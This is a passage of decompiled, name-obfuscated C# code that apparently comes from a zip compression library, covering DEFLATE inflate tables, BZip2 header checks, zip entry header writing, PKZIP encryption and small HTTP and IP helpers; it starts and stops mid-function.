			int[] int_12 = class44_0.int_11;
			num2 = 0;
			int_12[0] = 0;
			num = 0;
			int num7 = -1;
			int num8 = -num3;
			class44_0.int_10[0] = 0;
			int num9 = 0;
			int num10 = 0;
			for (; j <= num4; j++)
			{
				int num11 = class44_0.int_8[j];
				while (num11-- != 0)
				{
					int num12;
					while (j > num8 + num3)
					{
						num7++;
						num8 += num3;
						num10 = num4 - num8;
						num10 = ((num10 > num3) ? num3 : num10);
						if ((num12 = 1 << (i = j - num8)) > num11 + 1)
						{
							num12 -= num11 + 1;
							num6 = j;
							if (i < num10)
							{
								while (++i < num10 && (num12 <<= 1) > class44_0.int_8[++num6])
								{
									num12 -= class44_0.int_8[num6];
								}
							}
						}
						num10 = 1 << i;
						if (int_5[0] + num10 > 1440)
						{
							return -3;
						}
						num9 = (class44_0.int_10[num7] = int_5[0]);
						int_5[0] += num10;
						if (num7 != 0)
						{
							class44_0.int_11[num7] = num2;
							class44_0.int_9[0] = (sbyte)i;
							class44_0.int_9[1] = (sbyte)num3;
							i = (int)((uint)num2 >> num8 - num3);
							class44_0.int_9[2] = num9 - class44_0.int_10[num7 - 1] - i;
							Array.Copy(class44_0.int_9, 0, int_1, (class44_0.int_10[num7 - 1] + i) * 3, 3);
						}
						else
						{
							int_10[0] = num9;
						}
					}
					class44_0.int_9[1] = (sbyte)(j - num8);
					if (num >= int_4)
					{
						class44_0.int_9[0] = 192;
					}
					else if (int_8[num] < int_2)
					{
						class44_0.int_9[0] = (sbyte)((int_8[num] >= 256) ? 96 : 0);
						class44_0.int_9[2] = int_8[num++];
					}
					else
					{
						class44_0.int_9[0] = (sbyte)(int_7[int_8[num] - int_2] + 16 + 64);
						class44_0.int_9[2] = int_6[int_8[num++] - int_2];
					}
					num12 = 1 << j - num8;
					for (i = (int)((uint)num2 >> num8); i < num10; i += num12)
					{
						Array.Copy(class44_0.int_9, 0, int_1, (num9 + i) * 3, 3);
					}
					i = 1 << j - 1;
					while ((num2 & i) != 0)
					{
						num2 ^= i;
						i = (int)((uint)i >> 1);
					}
					num2 ^= i;
					int num13 = (1 << num8) - 1;
					while ((num2 & num13) != class44_0.int_11[num7])
					{
						num7--;
						num8 -= num3;
						num13 = (1 << num8) - 1;
					}
				}
			}
			if (num5 != 0 && num4 != 1)
			{
				return -5;
			}
			return 0;
		}
		return -3;
	}

	static void smethod_267(GClass0 gclass0_0)
	{
		if (gclass0_0.short_9 != 0 && gclass0_0.short_9 != 8 && gclass0_0.short_9 != 12)
		{
			throw new ZipException($"Entry {gclass0_0.string_1} uses an unsupported compression method (0x{gclass0_0.short_9:X2}, {gclass0_0.UnsupportedCompressionMethod})");
		}
	}

	static int smethod_268(Class38 class38_0)
	{
		short[] short_ = class38_0.short_2;
		int int_ = class38_0.class46_0.int_6;
		Class6.smethod_634(short_, int_, class38_0);
		short_ = class38_0.short_3;
		int_ = class38_0.class46_1.int_6;
		Class6.smethod_634(short_, int_, class38_0);
		Class6.smethod_643(class38_0.class46_2, class38_0);
		int num = Class48.int_1 - 1;
		while (num >= 3 && class38_0.short_4[Class46.sbyte_0[num] * 2 + 1] == 0)
		{
			num--;
		}
		class38_0.int_47 += 3 * (num + 1) + 5 + 5 + 4;
		return num;
	}

	static void smethod_269(IPAddress ipaddress_0, Class63 class63_0)
	{
		if (ipaddress_0 == null)
		{
			throw new ArgumentNullException();
		}
		class63_0.ipaddress_0 = ipaddress_0;
		Class6.smethod_37(class63_0);
	}

	static void smethod_270(Class54 class54_0, byte[] byte_0)
	{
		class54_0.byte_0 = byte_0;
	}

	static string smethod_271(string string_0)
	{
		string[][] array = new string[11][]
		{
			new string[2] { "([^']*)\\(\\(([^']+)", "$1( ($2" },
			new string[2] { "(.)\\)\\)", "$1) )" },
			new string[2] { "\\((\\S)", "( $1" },
			new string[2] { "(\\S)\\)", "$1 )" },
			new string[2] { "^\\)", " )" },
			new string[2] { "(\\S)\\(", "$1 (" },
			new string[2] { "\\)(\\S)", ") $1" },
			new string[2] { "(=)('[^']*')", "$1 $2" },
			new string[2] { "([^ !><])(>|<|!=|=)", "$1 $2" },
			new string[2] { "(>|<|!=|=)([^ =])", "$1 $2" },
			new string[2] { "/", "\\" }
		};
		string input = string_0;
		for (int i = 0; i < array.Length; i++)
		{
			string pattern = Class16.Class17.string_2 + array[i][0] + Class16.Class17.string_3;
			input = Regex.Replace(input, pattern, array[i][1]);
		}
		string pattern2 = "/" + Class16.Class17.string_1;
		input = Regex.Replace(input, pattern2, "\\");
		pattern2 = " " + Class16.Class17.string_1;
		return Regex.Replace(input, pattern2, "\u0006");
	}

	static int smethod_272(Class73.Stream14 stream14_0)
	{
		return Class6.smethod_469(stream14_0) | (Class6.smethod_469(stream14_0) << 16);
	}

	static void smethod_273(Stream6 stream6_0, char char_0, int int_0)
	{
		int num = stream6_0.stream_0.ReadByte();
		if (num != char_0)
		{
			string message = $"Not a valid BZip2 stream. byte {int_0}, expected '{(int)char_0}', got '{num}'";
			throw new IOException(message);
		}
	}

	static GClass0 smethod_274(Delegate0 delegate0_0, string string_0)
	{
		return Class6.smethod_597((object)delegate0_0, string_0, Enum0.const_4, (object)null);
	}

	static GClass0 smethod_275(Encoding encoding_0, GClass1 gclass1_0, string string_0, string string_1)
	{
		Class6.smethod_26(string_1, gclass1_0);
		return Class6.smethod_587(string_0, gclass1_0, string_1, encoding_0);
	}

	static GClass0 smethod_276(string string_0, string string_1, GClass1 gclass1_0)
	{
		if (File.Exists(string_1))
		{
			return Class6.smethod_407(gclass1_0, string_1, string_0);
		}
		if (!Directory.Exists(string_1))
		{
			throw new FileNotFoundException($"That file or directory ({string_1}) does not exist!");
		}
		return Class6.smethod_427(string_1, gclass1_0, string_0);
	}

	static bool smethod_277(Class61 class61_0, string string_0)
	{
		int num = string_0.IndexOf("\r\n\r\n");
		if (num == -1)
		{
			return false;
		}
		class61_0.stringDictionary_0 = Class6.smethod_91(string_0, class61_0);
		if (Class6.smethod_42(class61_0).ToUpper().Equals("POST"))
		{
			try
			{
				int num2 = int.Parse(Class6.smethod_517(class61_0)["Content-Length"]);
				return string_0.Length >= num + 6 + num2;
			}
			catch
			{
				class61_0.method_5();
				return true;
			}
		}
		return true;
	}

	static void smethod_278(int int_0, Stream11 stream11_0)
	{
		if (int_0 < 4)
		{
			throw new ArgumentException("MaxBufferPairs", "Value must be 4 or greater.");
		}
		stream11_0.int_2 = int_0;
	}

	static void smethod_279(Class59 class59_0, string string_0)
	{
		if (string_0 == null)
		{
			throw new ArgumentNullException();
		}
		class59_0.string_0 = string_0;
	}

	static int smethod_280(GClass0 gclass0_0, byte[] byte_0, int int_0, short short_0, long long_0)
	{
		if (short_0 != 32)
		{
			throw new BadReadException($"  Unexpected size (0x{short_0:X4}) for NTFS times extra field at position 0x{long_0:X16}");
		}
		int_0 += 4;
		short num = (short)(byte_0[int_0] + byte_0[int_0 + 1] * 256);
		short num2 = (short)(byte_0[int_0 + 2] + byte_0[int_0 + 3] * 256);
		int_0 += 4;
		if (num == 1 && num2 == 24)
		{
			long fileTime = BitConverter.ToInt64(byte_0, int_0);
			gclass0_0.dateTime_1 = DateTime.FromFileTimeUtc(fileTime);
			int_0 += 8;
			fileTime = BitConverter.ToInt64(byte_0, int_0);
			gclass0_0.dateTime_2 = DateTime.FromFileTimeUtc(fileTime);
			int_0 += 8;
			fileTime = BitConverter.ToInt64(byte_0, int_0);
			gclass0_0.dateTime_3 = DateTime.FromFileTimeUtc(fileTime);
			int_0 += 8;
			gclass0_0.bool_0 = true;
			gclass0_0.enum7_0 |= Enum7.flag_2;
			gclass0_0.bool_1 = true;
		}
		return int_0;
	}

	static int smethod_281(Class8 class8_0)
	{
		if (class8_0.gclass1_0 != null)
		{
			return class8_0.gclass1_0.int_1;
		}
		if (class8_0.stream1_0 != null)
		{
			throw new NotSupportedException();
		}
		return 0;
	}

	static void smethod_282(Class38 class38_0)
	{
		class38_0.int_26 = 2 * class38_0.int_23;
		Array.Clear(class38_0.short_1, 0, class38_0.int_28);
		class38_0.class39_0 = Class6.smethod_586(class38_0.enum20_0);
		Class6.smethod_175(class38_0);
		class38_0.int_36 = 0;
		class38_0.int_32 = 0;
		class38_0.int_38 = 0;
		class38_0.int_33 = (class38_0.int_39 = Class38.int_14 - 1);
		class38_0.int_35 = 0;
		class38_0.int_27 = 0;
	}

	static void smethod_283(Class38 class38_0, int int_0, int int_1, bool bool_0)
	{
		int num = 0;
		int num2;
		int num3;
		if (class38_0.enum20_0 > Enum20.const_0)
		{
			if (class38_0.sbyte_0 == Class38.int_12)
			{
				Class6.smethod_354(class38_0);
			}
			Class6.smethod_643(class38_0.class46_0, class38_0);
			Class6.smethod_643(class38_0.class46_1, class38_0);
			num = Class6.smethod_268(class38_0);
			num2 = class38_0.int_47 + 3 + 7 >> 3;
			num3 = class38_0.int_48 + 3 + 7 >> 3;
			if (num3 <= num2)
			{
				num2 = num3;
			}
		}
		else
		{
			num2 = (num3 = int_1 + 5);
		}
		if (int_1 + 4 <= num2 && int_0 != -1)
		{
			Class6.smethod_637(class38_0, int_0, int_1, bool_0);
		}
		else if (num3 == num2)
		{
			Class6.smethod_465(class38_0, (Class38.int_8 << 1) + (bool_0 ? 1 : 0), 3);
			short[] short_ = Class49.short_0;
			short[] short_2 = Class49.short_1;
			Class6.smethod_40(short_2, short_, class38_0);
		}
		else
		{
			Class6.smethod_465(class38_0, (Class38.int_9 << 1) + (bool_0 ? 1 : 0), 3);
			int int_2 = class38_0.class46_0.int_6 + 1;
			int int_3 = class38_0.class46_1.int_6 + 1;
			Class6.smethod_50(int_2, num + 1, int_3, class38_0);
			short[] short_ = class38_0.short_2;
			short[] short_2 = class38_0.short_3;
			Class6.smethod_40(short_2, short_, class38_0);
		}
		Class6.smethod_514(class38_0);
		if (bool_0)
		{
			Class6.smethod_155(class38_0);
		}
	}

	static void smethod_284(Class63 class63_0, int int_0)
	{
		if (int_0 <= 0)
		{
			throw new ArgumentException();
		}
		class63_0.int_0 = int_0;
		Class6.smethod_37(class63_0);
	}

	static byte[] smethod_285(Class60 class60_0)
	{
		return class60_0.byte_1;
	}

	static void smethod_286(GClass0 gclass0_0)
	{
		if (gclass0_0.stream_1 == null)
		{
			throw new ZipException($"The input stream is null for entry '{gclass0_0.string_1}'.");
		}
		if (gclass0_0.nullable_0.HasValue)
		{
			gclass0_0.stream_1.Position = gclass0_0.nullable_0.Value;
		}
		else if (gclass0_0.stream_1.CanSeek)
		{
			gclass0_0.nullable_0 = gclass0_0.stream_1.Position;
		}
		else if (gclass0_0.enum2_0 == Enum2.const_1 && gclass0_0.enum0_0 != Enum0.const_3 && (gclass0_0.short_7 & 8) != 8)
		{
			throw new ZipException("It is not possible to use PKZIP encryption on a non-seekable input stream");
		}
	}

	static int smethod_287(Stream8 stream8_0)
	{
		return stream8_0.int_1;
	}

	static void smethod_288(GClass0 gclass0_0, string string_0, object[] object_0)
	{
		if (gclass0_0.class8_0.gclass1_0 != null && gclass0_0.class8_0.gclass1_0.textWriter_0 != null)
		{
			gclass0_0.class8_0.gclass1_0.textWriter_0.WriteLine(string_0, object_0);
		}
	}

	static void smethod_289(string string_0, GClass1 gclass1_0, GClass0 gclass0_0, bool bool_0, int int_0)
	{
		EventHandler<EventArgs4> eventHandler_ = gclass1_0.eventHandler_2;
		if (eventHandler_ != null)
		{
			EventArgs4 eventArgs = new EventArgs4(gclass1_0.ArchiveNameForEvent, bool_0, gclass1_0.dictionary_0.Count, int_0, gclass0_0, string_0);
			eventHandler_(gclass1_0, eventArgs);
			if (eventArgs.bool_0)
			{
				gclass1_0.bool_9 = true;
			}
		}
	}

	static void smethod_290(GClass0 gclass0_0, Stream stream_0, int int_0)
	{
		Stream4 stream = stream_0 as Stream4;
		gclass0_0.long_5 = ((stream != null) ? Class6.smethod_452(stream) : stream_0.Position);
		int num = 0;
		int num2 = 0;
		byte[] array = new byte[30];
		num2 = 1;
		array[0] = 80;
		num2 = 2;
		array[1] = 75;
		num2 = 3;
		array[2] = 3;
		num2 = 4;
		array[3] = 4;
		gclass0_0.bool_13 = Class6.smethod_598(gclass0_0.class8_0) == Enum8.const_3 || (Class6.smethod_598(gclass0_0.class8_0) == Enum8.const_2 && !stream_0.CanSeek);
		short num3 = (short)(gclass0_0.bool_13 ? 45 : 20);
		if (gclass0_0.short_8 == 12)
		{
			num3 = 46;
		}
		array[num2++] = (byte)((uint)num3 & 0xFFu);
		array[num2++] = (byte)((num3 & 0xFF00) >> 8);
		byte[] array2 = Class6.smethod_325(gclass0_0);
		short num4 = (short)array2.Length;
		if (gclass0_0.enum2_0 == Enum2.const_0)
		{
			gclass0_0.short_7 &= -2;
		}
		else
		{
			gclass0_0.short_7 |= 1;
		}
		if (gclass0_0.encoding_1.CodePage == Encoding.UTF8.CodePage)
		{
			gclass0_0.short_7 |= 2048;
		}
		if (!gclass0_0.bool_4 && int_0 != 99)
		{
			if (!stream_0.CanSeek)
			{
				gclass0_0.short_7 |= 8;
			}
		}
		else
		{
			gclass0_0.short_7 &= -9;
			gclass0_0.short_7 &= -2;
			gclass0_0.Encryption = Enum2.const_0;
			gclass0_0.Password = null;
		}
		array[num2++] = (byte)((uint)gclass0_0.short_7 & 0xFFu);
		array[num2++] = (byte)((gclass0_0.short_7 & 0xFF00) >> 8);
		if (gclass0_0.long_3 == -1L)
		{
			gclass0_0.long_0 = 0L;
			gclass0_0.bool_5 = false;
		}
		Class6.smethod_590(gclass0_0, int_0);
		array[num2++] = (byte)((uint)gclass0_0.short_8 & 0xFFu);
		array[num2++] = (byte)((gclass0_0.short_8 & 0xFF00) >> 8);
		if (int_0 == 99)
		{
			Class6.smethod_25(gclass0_0);
		}
		else if (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3)
		{
			num2 -= 2;
			array[num2++] = 99;
			array[num2++] = 0;
		}
		gclass0_0.int_1 = Class6.smethod_579(gclass0_0.LastModified);
		array[num2++] = (byte)((uint)gclass0_0.int_1 & 0xFFu);
		array[num2++] = (byte)((gclass0_0.int_1 & 0xFF00) >> 8);
		array[num2++] = (byte)((gclass0_0.int_1 & 0xFF0000) >> 16);
		array[num2++] = (byte)((gclass0_0.int_1 & 0xFF000000L) >> 24);
		array[num2++] = (byte)((uint)gclass0_0.int_2 & 0xFFu);
		array[num2++] = (byte)((gclass0_0.int_2 & 0xFF00) >> 8);
		array[num2++] = (byte)((gclass0_0.int_2 & 0xFF0000) >> 16);
		array[num2++] = (byte)((gclass0_0.int_2 & 0xFF000000L) >> 24);
		if (gclass0_0.bool_13)
		{
			for (num = 0; num < 8; num++)
			{
				array[num2++] = byte.MaxValue;
			}
		}
		else
		{
			array[num2++] = (byte)((ulong)gclass0_0.long_0 & 0xFFuL);
			array[num2++] = (byte)((gclass0_0.long_0 & 0xFF00L) >> 8);
			array[num2++] = (byte)((gclass0_0.long_0 & 0xFF0000L) >> 16);
			array[num2++] = (byte)((gclass0_0.long_0 & 0xFF000000L) >> 24);
			array[num2++] = (byte)((ulong)gclass0_0.long_2 & 0xFFuL);
			array[num2++] = (byte)((gclass0_0.long_2 & 0xFF00L) >> 8);
			array[num2++] = (byte)((gclass0_0.long_2 & 0xFF0000L) >> 16);
			array[num2++] = (byte)((gclass0_0.long_2 & 0xFF000000L) >> 24);
		}
		array[num2++] = (byte)((uint)num4 & 0xFFu);
		array[num2++] = (byte)((num4 & 0xFF00) >> 8);
		gclass0_0.byte_1 = Class6.smethod_339(gclass0_0, bool_0: false);
		short num5 = (short)((gclass0_0.byte_1 != null) ? gclass0_0.byte_1.Length : 0);
		array[num2++] = (byte)((uint)num5 & 0xFFu);
		array[num2++] = (byte)((num5 & 0xFF00) >> 8);
		byte[] array3 = new byte[num2 + num4 + num5];
		Buffer.BlockCopy(array, 0, array3, 0, num2);
		Buffer.BlockCopy(array2, 0, array3, num2, array2.Length);
		num2 += array2.Length;
		if (gclass0_0.byte_1 != null)
		{
			Buffer.BlockCopy(gclass0_0.byte_1, 0, array3, num2, gclass0_0.byte_1.Length);
			num2 += gclass0_0.byte_1.Length;
		}
		gclass0_0.int_3 = num2;
		ZipSegmentedStream zipSegmentedStream = stream_0 as ZipSegmentedStream;
		if (zipSegmentedStream != null)
		{
			zipSegmentedStream.method_1(bool_2: true);
			uint num6 = Class6.smethod_656(zipSegmentedStream, num2);
			if (num6 != zipSegmentedStream.uint_0)
			{
				gclass0_0.long_5 = 0L;
			}
			else
			{
				gclass0_0.long_5 = zipSegmentedStream.Position;
			}
			gclass0_0.uint_0 = num6;
		}
		if (Class6.smethod_598(gclass0_0.class8_0) == Enum8.const_0 && (uint)gclass0_0.long_4 >= uint.MaxValue)
		{
			throw new ZipException("Offset within the zip archive exceeds 0xFFFFFFFF. Consider setting the UseZip64WhenSaving property on the ZipFile instance.");
		}
		stream_0.Write(array3, 0, num2);
		zipSegmentedStream?.method_1(bool_2: false);
		gclass0_0.byte_2 = array3;
	}

	static void smethod_291(Class31 class31_0, int int_0, uint uint_0)
	{
		int num = class31_0.int_0;
		uint num2 = class31_0.uint_0;
		while (num >= 8)
		{
			class31_0.stream_0.WriteByte((byte)((num2 >> 24) & 0xFFu));
			class31_0.int_1++;
			num2 <<= 8;
			num -= 8;
		}
		class31_0.uint_0 = num2 | (uint_0 << 32 - num - int_0);
		class31_0.int_0 = num + int_0;
	}

	static Enum9 smethod_292(Class8 class8_0)
	{
		if (class8_0.gclass1_0 != null)
		{
			return class8_0.gclass1_0.enum9_0;
		}
		if (class8_0.stream0_0 != null)
		{
			return class8_0.stream0_0.enum9_0;
		}
		return Enum9.const_0;
	}

	static void smethod_293(GClass1 gclass1_0)
	{
		try
		{
			if (File.Exists(gclass1_0.string_4))
			{
				File.Delete(gclass1_0.string_4);
			}
		}
		catch (IOException ex)
		{
			if (gclass1_0.textWriter_0 != null)
			{
				gclass1_0.textWriter_0.WriteLine("ZipFile::Save: could not delete temp file: {0}.", ex.Message);
			}
		}
	}

	static void smethod_294(string string_0, string string_1, GClass0 gclass0_0, Enum3 enum3_0)
	{
		gclass0_0.ExtractExistingFile = enum3_0;
		Class6.smethod_497(string_1, (Stream)null, string_0, gclass0_0);
	}

	static void smethod_295(string string_0, GClass1 gclass1_0, string string_1)
	{
		Class6.smethod_126((string)null, bool_0: false, string_0, gclass1_0, string_1);
	}

	static void smethod_296(string string_0, out Stream stream_0, out string string_1)
	{
		for (int i = 0; i < 3; i++)
		{
			try
			{
				string_1 = Path.Combine(string_0, Class6.smethod_152());
				stream_0 = new FileStream(string_1, FileMode.CreateNew);
				return;
			}
			catch (IOException)
			{
				if (i == 2)
				{
					throw;
				}
			}
		}
		throw new IOException();
	}

	static Stream smethod_297(uint uint_0, GClass1 gclass1_0)
	{
		if (uint_0 + 1 != gclass1_0.uint_0 && (uint_0 != 0 || gclass1_0.uint_0 != 0))
		{
			return Class6.smethod_458(gclass1_0.string_1 ?? gclass1_0.string_0, uint_0, gclass1_0.uint_0);
		}
		return gclass1_0.ReadStream;
	}

	static int smethod_298(GClass2 gclass2_0)
	{
		return Class6.smethod_128(gclass2_0, bool_0: true);
	}

	static void smethod_299()
	{
		try
		{
			Class6.smethod_437();
		}
		catch (Exception)
		{
		}
	}

	static byte[] smethod_300(Class21 class21_0, byte[] byte_0, int int_0)
	{
		if (byte_0 == null)
		{
			throw new ArgumentNullException("plaintext");
		}
		if (int_0 > byte_0.Length)
		{
			throw new ArgumentOutOfRangeException("length", "Bad length during Encryption: The length parameter must be smaller than or equal to the size of the destination array.");
		}
		byte[] array = new byte[int_0];
		for (int i = 0; i < int_0; i++)
		{
			byte byte_ = byte_0[i];
			array[i] = (byte)(byte_0[i] ^ Class6.smethod_189(class21_0));
			Class6.smethod_583(class21_0, byte_);
		}
		return array;
	}

	static Class9 smethod_301(Class15 class15_0)
	{
		return class15_0.class9_1;
	}

	static void smethod_302(IEnumerable<string> ienumerable_0, string string_0, GClass1 gclass1_0)
	{
		if (ienumerable_0 == null)
		{
			throw new ArgumentNullException("fileNames");
		}
		Class6.smethod_384(gclass1_0);
		foreach (string item in ienumerable_0)
		{
			Class6.smethod_129(gclass1_0, item, string_0);
		}
		Class6.smethod_211(gclass1_0);
	}

	static void smethod_303(int int_0, int int_1, Class32 class32_0)
	{
		byte[][] byte_ = class32_0.class33_0.byte_4;
		int[] int_2 = class32_0.class33_0.int_0;
		int num = class32_0.int_10;
		int num2 = 0;
		for (int num3 = int_0; num3 > 0; num3--)
		{
			int num4 = num / num3;
			int num5 = num2 - 1;
			int i = 0;
			int num6 = int_1 - 1;
			for (; i < num4; i += int_2[++num5])
			{
				if (num5 >= num6)
				{
					break;
				}
			}
			if (num5 > num2 && num3 != int_0 && num3 != 1 && ((uint)(int_0 - num3) & (true ? 1u : 0u)) != 0)
			{
				i -= int_2[num5--];
			}
			byte[] array = byte_[num3 - 1];
			int num7 = int_1;
			while (--num7 >= 0)
			{
				if (num7 >= num2 && num7 <= num5)
				{
					array[num7] = Class32.byte_1;
				}
				else
				{
					array[num7] = Class32.byte_0;
				}
			}
			num2 = num5 + 1;
			num -= i;
		}
	}

	static void smethod_304(Class31 class31_0)
	{
		Class6.smethod_291(class31_0, 0, 0u);
	}

	static string smethod_305(int int_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		RNGCryptoServiceProvider rngcryptoServiceProvider_ = new RNGCryptoServiceProvider();
		while (int_0-- > 0)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"[Class6.smethod_464(rngcryptoServiceProvider_, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".Length)]);
		}
		return stringBuilder.ToString();
	}

	static void smethod_306(Class31 class31_0)
	{
		class31_0.uint_0 = 0u;
		class31_0.int_0 = 0;
		class31_0.int_1 = 0;
		class31_0.stream_0.Seek(0L, SeekOrigin.Begin);
		class31_0.stream_0.SetLength(0L);
	}

	static EventArgs5 smethod_307(GClass0 gclass0_0, string string_0, Exception exception_0)
	{
		EventArgs5 eventArgs = new EventArgs5();
		eventArgs.enum6_0 = Enum6.const_23;
		eventArgs.string_0 = string_0;
		eventArgs.gclass0_0 = gclass0_0;
		eventArgs.exception_0 = exception_0;
		return eventArgs;
	}

	static int smethod_308(Class40 class40_0, int int_0)
	{
		int num = class40_0.gclass2_0.int_0;
		int num2 = class40_0.gclass2_0.int_1;
		int num3 = class40_0.int_9;
		int i = class40_0.int_8;
		int num4 = class40_0.int_13;
		int num5 = ((num4 < class40_0.int_12) ? (class40_0.int_12 - num4 - 1) : (class40_0.int_11 - num4));
		while (true)
		{
			switch (class40_0.enum16_0)
			{
			case Class40.Enum16.const_6:
				class40_0.int_9 = num3;
				class40_0.int_8 = i;
				class40_0.gclass2_0.int_1 = num2;
				class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
				class40_0.gclass2_0.int_0 = num;
				class40_0.int_13 = num4;
				int_0 = Class6.smethod_526(int_0, class40_0, class40_0.class42_0);
				if (int_0 == 1)
				{
					int_0 = 0;
					num = class40_0.gclass2_0.int_0;
					num2 = class40_0.gclass2_0.int_1;
					num3 = class40_0.int_9;
					i = class40_0.int_8;
					num4 = class40_0.int_13;
					num5 = ((num4 < class40_0.int_12) ? (class40_0.int_12 - num4 - 1) : (class40_0.int_11 - num4));
					if (class40_0.int_7 == 0)
					{
						class40_0.enum16_0 = Class40.Enum16.const_0;
						break;
					}
					class40_0.enum16_0 = Class40.Enum16.const_7;
					goto case Class40.Enum16.const_7;
				}
				return Class6.smethod_639(class40_0, int_0);
			case Class40.Enum16.const_5:
			{
				int num6;
				while (true)
				{
					num6 = class40_0.int_2;
					if (class40_0.int_3 >= 258 + (num6 & 0x1F) + ((num6 >> 5) & 0x1F))
					{
						break;
					}
					for (num6 = class40_0.int_5[0]; i < num6; i += 8)
					{
						if (num2 != 0)
						{
							int_0 = 0;
							num2--;
							num3 |= (class40_0.gclass2_0.byte_0[num++] & 0xFF) << i;
							continue;
						}
						class40_0.int_9 = num3;
						class40_0.int_8 = i;
						class40_0.gclass2_0.int_1 = num2;
						class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
						class40_0.gclass2_0.int_0 = num;
						class40_0.int_13 = num4;
						return Class6.smethod_639(class40_0, int_0);
					}
					num6 = class40_0.int_10[(class40_0.int_6[0] + (num3 & Class41.int_0[num6])) * 3 + 1];
					int num7 = class40_0.int_10[(class40_0.int_6[0] + (num3 & Class41.int_0[num6])) * 3 + 2];
					if (num7 < 16)
					{
						num3 >>= num6;
						i -= num6;
						class40_0.int_4[class40_0.int_3++] = num7;
						continue;
					}
					int num8 = ((num7 == 18) ? 7 : (num7 - 14));
					int num9 = ((num7 == 18) ? 11 : 3);
					for (; i < num6 + num8; i += 8)
					{
						if (num2 != 0)
						{
							int_0 = 0;
							num2--;
							num3 |= (class40_0.gclass2_0.byte_0[num++] & 0xFF) << i;
							continue;
						}
						class40_0.int_9 = num3;
						class40_0.int_8 = i;
						class40_0.gclass2_0.int_1 = num2;
						class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
						class40_0.gclass2_0.int_0 = num;
						class40_0.int_13 = num4;
						return Class6.smethod_639(class40_0, int_0);
					}
					num3 >>= num6;
					i -= num6;
					num9 += num3 & Class41.int_0[num8];
					num3 >>= num8;
					i -= num8;
					num8 = class40_0.int_3;
					num6 = class40_0.int_2;
					if (num8 + num9 <= 258 + (num6 & 0x1F) + ((num6 >> 5) & 0x1F) && (num7 != 16 || num8 >= 1))
					{
						num7 = ((num7 == 16) ? class40_0.int_4[num8 - 1] : 0);
						do
						{
							class40_0.int_4[num8++] = num7;
						}
						while (--num9 != 0);
						class40_0.int_3 = num8;
						continue;
					}
					class40_0.int_4 = null;
					class40_0.enum16_0 = Class40.Enum16.const_9;
					class40_0.gclass2_0.string_0 = "invalid bit length repeat";
					int_0 = -3;
					class40_0.int_9 = num3;
					class40_0.int_8 = i;
					class40_0.gclass2_0.int_1 = num2;
					class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
					class40_0.gclass2_0.int_0 = num;
					class40_0.int_13 = num4;
					return Class6.smethod_639(class40_0, -3);
				}
				class40_0.int_6[0] = -1;
				int[] array5 = new int[1] { 9 };
				int[] array6 = new int[1] { 6 };
				int[] array7 = new int[1];
				int[] array8 = new int[1];
				num6 = class40_0.int_2;
				Class44 class44_2 = class40_0.class44_0;
				int[] int_5 = class40_0.int_4;
				int[] int_6 = class40_0.int_10;
				GClass2 gclass2_2 = class40_0.gclass2_0;
				num6 = Class6.smethod_123(array5, class44_2, gclass2_2, array7, 257 + (num6 & 0x1F), int_6, 1 + ((num6 >> 5) & 0x1F), array6, array8, int_5);
				if (num6 == 0)
				{
					Class6.smethod_227(class40_0.class42_0, array5[0], array6[0], class40_0.int_10, array7[0], class40_0.int_10, array8[0]);
					class40_0.enum16_0 = Class40.Enum16.const_6;
					goto case Class40.Enum16.const_6;
				}
				if (num6 == -3)
				{
					class40_0.int_4 = null;
					class40_0.enum16_0 = Class40.Enum16.const_9;
				}
				int_0 = num6;
				class40_0.int_9 = num3;
				class40_0.int_8 = i;
				class40_0.gclass2_0.int_1 = num2;
				class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
				class40_0.gclass2_0.int_0 = num;
				class40_0.int_13 = num4;
				return Class6.smethod_639(class40_0, int_0);
			}
			case Class40.Enum16.const_4:
			{
				while (class40_0.int_3 < 4 + (class40_0.int_2 >> 10))
				{
					for (; i < 3; i += 8)
					{
						if (num2 != 0)
						{
							int_0 = 0;
							num2--;
							num3 |= (class40_0.gclass2_0.byte_0[num++] & 0xFF) << i;
							continue;
						}
						class40_0.int_9 = num3;
						class40_0.int_8 = i;
						class40_0.gclass2_0.int_1 = num2;
						class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
						class40_0.gclass2_0.int_0 = num;
						class40_0.int_13 = num4;
						return Class6.smethod_639(class40_0, int_0);
					}
					class40_0.int_4[Class40.int_0[class40_0.int_3++]] = num3 & 7;
					num3 >>= 3;
					i -= 3;
				}
				while (class40_0.int_3 < 19)
				{
					class40_0.int_4[Class40.int_0[class40_0.int_3++]] = 0;
				}
				class40_0.int_5[0] = 7;
				Class44 class44_ = class40_0.class44_0;
				int[] int_ = class40_0.int_4;
				int[] int_2 = class40_0.int_5;
				int[] int_3 = class40_0.int_6;
				int[] int_4 = class40_0.int_10;
				GClass2 gclass2_ = class40_0.gclass2_0;
				int num6 = Class6.smethod_341(int_3, class44_, int_4, int_2, int_, gclass2_);
				if (num6 == 0)
				{
					class40_0.int_3 = 0;
					class40_0.enum16_0 = Class40.Enum16.const_5;
					goto case Class40.Enum16.const_5;
				}
				int_0 = num6;
				if (int_0 == -3)
				{
					class40_0.int_4 = null;
					class40_0.enum16_0 = Class40.Enum16.const_9;
				}
				class40_0.int_9 = num3;
				class40_0.int_8 = i;
				class40_0.gclass2_0.int_1 = num2;
				class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
				class40_0.gclass2_0.int_0 = num;
				class40_0.int_13 = num4;
				return Class6.smethod_639(class40_0, int_0);
			}
			case Class40.Enum16.const_3:
			{
				for (; i < 14; i += 8)
				{
					if (num2 != 0)
					{
						int_0 = 0;
						num2--;
						num3 |= (class40_0.gclass2_0.byte_0[num++] & 0xFF) << i;
						continue;
					}
					class40_0.int_9 = num3;
					class40_0.int_8 = i;
					class40_0.gclass2_0.int_1 = num2;
					class40_0.gclass2_0.long_0 += num - class40_0.gclass2_0.int_0;
					class40_0.gclass2_0.int_0 = num;
					class40_0.int_13 = num4;
					return Class6.smethod_639(class40_0, int_0);
				}
